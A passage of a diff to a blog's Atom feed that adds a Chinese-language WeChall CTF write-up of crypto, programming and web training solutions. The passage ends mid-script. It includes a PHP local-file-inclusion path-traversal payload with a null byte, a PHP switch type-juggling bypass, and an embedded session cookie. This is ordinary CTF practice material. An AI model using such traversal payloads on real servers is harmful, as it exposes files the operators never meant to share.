+&lt;p&gt;&lt;a href=&quot;http://1person.me/deepXssPrompt1/&quot;&gt;http://1person.me/deepXssPrompt1/&lt;/a&gt;&lt;/p&gt;</content><author><name>Catcher</name></author><category term="xss" /><summary type="html">xss 的在线练习，挺不错的，整个在线网站看起来也很可以。</summary></entry><entry><title type="html">hackburger writeup</title><link href="http://localhost:4000/2018/08/31/hackburger/" rel="alternate" type="text/html" title="hackburger writeup" /><published>2018-08-31T00:00:00+08:00</published><updated>2018-08-31T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/31/hackburger</id><content type="html" xml:base="http://localhost:4000/2018/08/31/hackburger/">&lt;p&gt;全是 Web 安全的题目，很有意思而且还有一点难度，在这里记录一下题目的 writeup， 持续更新……&lt;/p&gt;
 
 &lt;!--more--&gt;
 
@@ -2003,4 +2232,518 @@ regExp = /^-?([1-9]\d*\.\d*|0\.\d*[1-9]\d*|0?\.0+|0)$/;
 
 &lt;h2 id=&quot;许可证&quot;&gt;许可证&lt;/h2&gt;
 
-&lt;p&gt;MIT © &lt;a href=&quot;mailto:ziishaned@gmail.com&quot;&gt;Zeeshan Ahmed&lt;/a&gt;&lt;/p&gt;</content><author><name>Catcher</name></author><category term="regex" /><summary type="html">来自 github 上的正则表达式基础，特别好，一定要搞熟。原文链接 还有几篇特别好的: 正则表达式30分钟入门教程 JS 正则表达式 正则表达式速查表</summary></entry></feed>
+&lt;p&gt;MIT © &lt;a href=&quot;mailto:ziishaned@gmail.com&quot;&gt;Zeeshan Ahmed&lt;/a&gt;&lt;/p&gt;</content><author><name>Catcher</name></author><category term="regex" /><summary type="html">来自 github 上的正则表达式基础，特别好，一定要搞熟。原文链接 还有几篇特别好的: 正则表达式30分钟入门教程 JS 正则表达式 正则表达式速查表</summary></entry><entry><title type="html">wechall writeup</title><link href="http://localhost:4000/2018/08/19/wechall/" rel="alternate" type="text/html" title="wechall writeup" /><published>2018-08-19T00:00:00+08:00</published><updated>2018-08-19T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/19/wechall</id><content type="html" xml:base="http://localhost:4000/2018/08/19/wechall/">&lt;p&gt;国外的一个 CTF 网站，挺多人做这个的，这篇就记录 wechall 上题目的 writeup，持续更新……&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;h2 id=&quot;1training-get-sourced&quot;&gt;1.Training: Get Sourced&lt;/h2&gt;
+&lt;p&gt;查看源码&lt;/p&gt;
+
+&lt;h2 id=&quot;2training-stegano-i&quot;&gt;2.Training: Stegano I&lt;/h2&gt;
+
+&lt;p&gt;用文本编辑器查看图片&lt;/p&gt;
+
+&lt;h2 id=&quot;3training-crypto---caesar-i&quot;&gt;3.Training: Crypto - Caesar I&lt;/h2&gt;
+
+&lt;p&gt;一般的凯撒密码&lt;/p&gt;
+
+&lt;h2 id=&quot;4training-www-robots&quot;&gt;4.Training: WWW-Robots&lt;/h2&gt;
+
+&lt;p&gt;robots.txt&lt;/p&gt;
+
+&lt;h2 id=&quot;5training-ascii&quot;&gt;5.Training: ASCII&lt;/h2&gt;
+
+&lt;p&gt;ascii 转换&lt;/p&gt;
+
+&lt;h2 id=&quot;6encodings-url&quot;&gt;6.Encodings: URL&lt;/h2&gt;
+
+&lt;p&gt;url 解码&lt;/p&gt;
+
+&lt;h2 id=&quot;7prime-factory&quot;&gt;7.Prime Factory&lt;/h2&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;isPrime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
+
+
+&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;isPrime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;isPrime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+        
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;8training-encodings-i&quot;&gt;8.Training: Encodings I&lt;/h2&gt;
+
+&lt;p&gt;掌握一下 wechall 赠送的 Java 小程序的使用&lt;/p&gt;
+
+&lt;h2 id=&quot;9training-programming-1&quot;&gt;9.Training: Programming 1&lt;/h2&gt;
+
+&lt;p&gt;就是不能手动来&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#coding: utf-8&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;url1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;https://www.wechall.net/challenge/training/programming1/index.php?action=request&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;url2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;https://www.wechall.net/challenge/training/programming1/index.php?answer={}&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;rq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookies_are&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'gsScrollPos-1723=; gsScrollPos-3680=0; WC=10718669-41869-tIrWzQ3iD9EFBssa'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;response1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;url2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;response2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;10training-regex&quot;&gt;10.Training: Regex&lt;/h2&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/^$/
+/^wechall$/
+/^wechall4?\.(?:jpg|gif|tiff|png|bmp)$/
+#注意这里是只匹配：wechall4.tiff, wechall.png, wechall4.jpg, wechall.bmp，不能匹配其他的。
+#(?:exp) =&amp;gt; 匹配exp,不捕获匹配的文本，也不给此分组分配组号
+
+/^(wechall4?)\.(?:jpg|gif|tiff|png|bmp)$/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;11training-php-lfi&quot;&gt;11.Training: PHP LFI&lt;/h2&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/challenge/training/php/lfi/up/index.php?file=../../solution.php%00
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;12php-0817&quot;&gt;12.PHP 0817&lt;/h2&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;如果switch是数字类型的case的判断时，switch会将其中的参数转换为int类型。&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;?which=solution
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;switch 在这里会将 &lt;code class=&quot;highlighter-rouge&quot;&gt;solution&lt;/code&gt; 转换成 &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt;， 从而绕过。&lt;/p&gt;
+
+&lt;h2 id=&quot;13training-crypto---transposition-i&quot;&gt;13.Training: Crypto - Transposition I&lt;/h2&gt;
+
+&lt;p&gt;到这里来&lt;a href=&quot;https://www.dcode.fr/transposition-cipher&quot;&gt;https://www.dcode.fr/transposition-cipher&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;BY KNOWING THE KEY LENGTH =&amp;gt; 选择 4&lt;/p&gt;
+
+&lt;h2 id=&quot;14training-crypto---substitution-i&quot;&gt;14.Training: Crypto - Substitution I&lt;/h2&gt;
+
+&lt;p&gt;单表替换密码: &lt;a href=&quot;https://quipqiup.com/&quot;&gt;https://quipqiup.com/&lt;/a&gt; 答案要转小写&lt;/p&gt;
+
+&lt;h2 id=&quot;15training-crypto---caesar-ii&quot;&gt;15.Training: Crypto - Caesar II&lt;/h2&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
+6C 14 14 09 20 0F 14 07 51 20 1E 14 1A 20 18 14
+11 1B 0A 09 20 14 13 0A 20 12 14 17 0A 20 08 0D
+06 11 11 0A 13 0C 0A 20 0E 13 20 1E 14 1A 17 20
+0F 14 1A 17 13 0A 1E 53 20 79 0D 0E 18 20 14 13
+0A 20 1C 06 18 20 0B 06 0E 17 11 1E 20 0A 06 18
+1E 20 19 14 20 08 17 06 08 10 53 20 7C 06 18 13
+4C 19 20 0E 19 64 20 56 57 5D 20 10 0A 1E 18 20
+0E 18 20 06 20 16 1A 0E 19 0A 20 18 12 06 11 11
+20 10 0A 1E 18 15 06 08 0A 51 20 18 14 20 0E 19
+20 18 0D 14 1A 11 09 13 4C 19 20 0D 06 1B 0A 20
+19 06 10 0A 13 20 1E 14 1A 20 19 14 14 20 11 14
+13 0C 20 19 14 20 09 0A 08 17 1E 15 19 20 19 0D
+0E 18 20 12 0A 18 18 06 0C 0A 53 20 7C 0A 11 11
+20 09 14 13 0A 51 20 1E 14 1A 17 20 18 14 11 1A
+19 0E 14 13 20 0E 18 20 0B 12 14 17 11 18 14 13
+09 0B 0A 13 53
+&quot;&quot;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remove&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# 26-128&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;129&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;ch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;	
+			&lt;span class=&quot;n&quot;&gt;ch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ch&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;#############################################################&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;16training-crypto---digraphs&quot;&gt;16.Training: Crypto - Digraphs&lt;/h2&gt;
+
+&lt;p&gt;先猜第一个对应的单词是&lt;code class=&quot;highlighter-rouge&quot;&gt;congratulations&lt;/code&gt;，然后建立字典慢慢玩下去，跟数独有点像。&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#coding: utf-8&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;uansbneeuqxirstnvnxirsjznsbntvgj ninstn ggwkffuqyuqprswkgg rsejjztv iowktvtvxieewk tvtnffffwktvtvpftnvnvnyugj vexitv bnnsrs rsnsns ggjzpfpfjzfftnvnrs wkjzrsejwkuqex xyxitv jzrsqb vewkvnvnex eensnsgg fxnssugj kvbnrswkuq rsejjztv oqwkyuxynsuqgg xitv tvnsvntnrsjznsbnjt vnvnnseejzpfpfvnpfejejpfgj&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;data_A&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;ans&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;congratulations&quot;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ans&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
